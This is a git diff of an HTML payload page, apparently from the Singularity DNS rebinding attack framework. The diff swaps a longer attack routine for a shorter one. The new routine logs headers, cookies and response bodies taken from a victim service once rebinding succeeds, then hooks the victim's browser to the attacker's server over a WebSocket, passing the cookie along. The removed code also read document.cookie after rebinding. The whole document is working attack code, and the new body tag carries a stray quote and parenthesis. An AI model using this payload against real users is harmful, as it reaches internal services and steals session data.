@@ -10,80 +10,27 @@ were working from the target environment.
 	<title>payload-hook-and-control</title>
 	<script src="payload.js"></script>
 	<script>
-		/**
-		 * The attack() function is called when the user clicks the "Start Attack" button.
-		 */
-		let initialCookie = "";
+		// attack() is called once DNS rebinding is successful
+		// headers and body contains server data obtained 
+		// from the victim service during rebinding, if any.
+		function attack(headers, cookie, body) {
+			if (headers !== null) { 
+			console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
+			};
+			if (cookie !== null) { 
+			console.log(`Origin: ${window.location} headers: ${cookie}`);
+			};
+			if (body !== null) {
+			console.log(`Origin: ${window.location} body:\n${body}`);
+			};
 
-		function attack() {
-
-			/* Send a GET request to '/' (the root web directory) to the IP address and
-			port defined in the manager UI. */
-			fetch('/', {credentials: 'omit',})
-				.then(function (r) {
-					if (r.ok) {
-						console.log(`attack frame ${window.location.hostname} received a response`);
-						return r.text()
-					} else if (r.headers.get('www-authenticate') !== null) {
-						return new Promise(function(resolve, reject) {
-							reject(new Error('This resource requires HTTP Authentication.'));
-						});
-					} 
-					else {
-						throw new Error("Could not fetch requested resource.")
-					}
-				})
-				.then(function (response) { // we successfully received the server response
-					if (response.includes(indextoken) == false && response.length > 0) {
-						//if (response.status === 401) {
-						//	throw new Error('This resource requires authentication');
-						//}
-						clearInterval(timer); // stop the attack timer
-						console.log("SUCCESS"); // log to the console
-						initialCookie = document.cookie;
-						const rebindingStatusEl = document.getElementById('rebindingstatus');
-						rebindingStatusEl.innerText = `DNS rebinding successful!`;
-						// Terminate the DNS rebinding
-						attackSuccess(`Server response: ${response}`);
-						// TKTK implements retry to hand,e multiple A records fireball block.
-						webSocketHook(initialCookie);
-
-					} else {
-						// We saw the token in the response. DNS Rebinding did not happen.
-						// Let's wait for the next time.
-						throw new Error('hastoken');
-					}
-				})
-				.catch(function (error) {
-					if (error instanceof TypeError) { // We cannot establish an HTTP connection
-						console.log("frame " + window.location.hostname + " could not load");
-						window.parent.postMessage({
-							status: "error",
-						}, "*")
-					} else if (error.message == 'hastoken') {
-						console.log('DNS rebinding did not happen yet')
-					} else if (error.message == '404') { // We received a 404
-						console.log("file not found. Frame " + window.location.hostname +
-							" has not updated dns yet, waiting " + interval +
-							" ms")
-					} else { // We did not handle something
-						console.log('Unhandled error: ' + error);
-						window.parent.postMessage({
-							status: "error",
-						}, "*");
-					}
-				});
+			// establish ws connection to Singularity server
+			webSocketHook(cookie);
 		}
 	</script>
 </head>
-<body onload="begin()">
+
+<body onload="begin('/')")>
 	<h3>Hook and Control Payload</h3>
 	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
-	<script>
-		const hostnameEl = document.getElementById('hostname');
-		const arr = window.location.hostname.split('-');
-		const port = document.location.port ? document.location.port : "80";
-		hostnameEl.innerText = `target: ${arr[2]}:${port}, session: ${arr[3]}, strategy: ${arr[4]}`;
-	</script>
-</body>
-</html>
+</body></html>
